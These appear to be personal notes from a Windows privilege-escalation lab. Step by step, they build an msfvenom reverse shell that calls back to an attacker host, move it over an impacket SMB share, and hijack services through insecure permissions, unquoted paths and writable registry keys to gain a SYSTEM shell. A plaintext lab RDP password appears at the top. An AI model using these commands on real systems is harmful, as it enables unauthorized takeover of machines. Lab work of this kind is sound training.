xfreerdp /u:user /p:password321 /cert:ignore /v:10.10.0.189

## Reverse Shell
1. Created Reverse shell executable on host machine
- msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f exe -o reverse.exe
2. Created SMB Server on host kali machine to transfer reverse shell exec to Windows Machine
- sudo python3 /opt/impacket/examples/smbserver.py kali .
3. Copied reverse.exe to windows machine
- copy \\10.10.132.21 \kali\reverse.exe C:\PrivEsc\reverse.exe
4. Setup netcat to test the shell
- sudo nc -nvlp 53
5. Ran reverse shell from windows machine
-  C:\PrivEsc\reverse.exe

## Service Exploits - Insecure Service Permissions
1. Usec accesschk.exe  to check user account permissions for daclsvc
- C:\PrivEsc\accesschk.exe /accepteula -uwcqv user daclsvc
2. Check system privileges
- sc qc daclsvc
3. Modified service Binary path to the reverse.exe
- sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""
4. Started netcat listener on Kali machine and then ran dasclsvc service
- net start daclsvc

## Service Exploits - Unquoted Service Path
1. Used accesschk.exe alloweing to write to the C:\Program Files\Unquoted Path Service\ directory.
- C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
2. Copied the reverse.exe to a new path and renaming it common.exe
- copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"
3. Started lsitener on kali machine and then ran unquotedsvc service
- net start unquotedsvc

## Service Exploits - Weak Registry Permissions
1. Used accesschk.exe, noted that the registry entry for the regsvc service is writable by the "NT AUTHORITY\INTERACTIVE" group (essentially all logged-on users):
- C:\PrivEsc\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
2. Overwritd  the ImagePath registry key to point to the reverse.exe executable
- reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
3. Started kali netcat listener and ran regsvc to gain shell.

## Service Exploits - Insecure Service Executables
